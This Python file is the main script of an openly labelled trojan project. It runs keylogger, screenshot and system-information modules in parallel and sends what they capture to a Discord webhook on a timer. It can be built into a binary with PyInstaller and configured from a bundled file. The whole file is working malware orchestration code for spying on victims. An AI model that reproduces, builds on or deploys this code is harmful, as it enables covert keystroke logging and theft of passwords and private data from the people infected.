#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import configparser
import os
import platform
import sys
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from uuid import uuid4

from src.modules import Discord, KeyLogger, ScreenShot, SystemInformation


class Trojan:
    def __init__(self, *, exfil_time: float, webhook: str):
        """Set up a Trojan composed of exploitation and exfiltration
        modules.

        :param exfil_time: Time in seconds to wait between periodic
            executions of the exfiltration of logged data. Set to
            None to perform a single operation.
        :param webhook: URL to the Webhook set up on the Discord
            server's configuration.
        """
        self.exfil_time = exfil_time
        self.webhook = webhook

    @property
    def screenshot_path(self) -> str:
        """Gets a platform-dependent absolute path for the screenshot
        file."""
        filename = f"{str(uuid4())}.jpeg"
        if platform.system() == "Windows":
            app_data = os.path.expandvars(r"%LOCALAPPDATA%")
            path = os.path.join(app_data, "Temp", filename)
        else:  # Linux/Unix/MacOS
            path = f"/tmp/{filename}"
        return path

    @property
    def modules(self) -> set[KeyLogger, ScreenShot, SystemInformation]:
        """Gets a set of module instances ready for execution."""
        return {
            KeyLogger(exfil_time=self.exfil_time),
            ScreenShot(exfil_time=self.exfil_time,
                       image_path=self.screenshot_path),
            SystemInformation()
        }

    def execute(self) -> None:
        with ThreadPoolExecutor() as executor:
            for module in self.modules:
                Discord(module=module, webhook_url=self.webhook)
                executor.submit(module.execute)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--webhook",
                        type=str,
                        metavar="<webhook_url>")
    parser.add_argument("-e", "--exfil-time",
                        type=float,
                        metavar="<seconds>",
                        default=30)
    _args = parser.parse_args()

    try:
        '''Trojan is executed as a binary compiled by PyInstaller. All 
        configuration options are read from the 'trojan.cfg' file that 
        is bundled in the binary during the build process defined in the 
        'build.py' file. In this case the location of all added data 
        will be a temporary directory set by sys._MEIPASS. If such 
        directory does not exist then an AttributeError is raised.'''
        tmp_dir = Path(sys._MEIPASS)
        config = configparser.ConfigParser()
        config_file = config.read(tmp_dir.joinpath("trojan.cfg"))
        if len(config_file) == 0:
            raise SystemExit(
                "Cannot initialize the trojan without specification of a "
                "Discord Webhook URL to connect to."
            )
        client_cfg = config["TROJAN"]
        Trojan(
            webhook=client_cfg.get("Webhook"),
            exfil_time=client_cfg.getint("ExfiltrationTime")
        ).execute()
    except AttributeError:
        '''Trojan is executed from source code by the system interpreter 
        for development purposes. All configuration options are parsed 
        from the CLI.'''
        Trojan(webhook=_args.webhook, exfil_time=_args.exfil_time).execute()
